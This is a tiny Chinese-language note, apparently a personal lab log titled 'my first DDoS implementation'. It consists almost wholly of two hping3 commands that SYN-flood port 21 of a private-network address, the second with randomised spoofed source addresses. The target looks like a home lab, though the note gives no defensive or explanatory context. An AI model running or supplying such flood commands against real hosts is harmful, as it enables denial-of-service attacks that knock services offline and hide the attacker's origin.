
### 這是我第一次的DDos實作。

  hping3 -V  -c 100000 -d 100 -S -p 21 --flood 192.168.43.129
  hping3 -V  -c 100000 -d 100 -S -p 21 --flood --rand-source 192.168.43.129
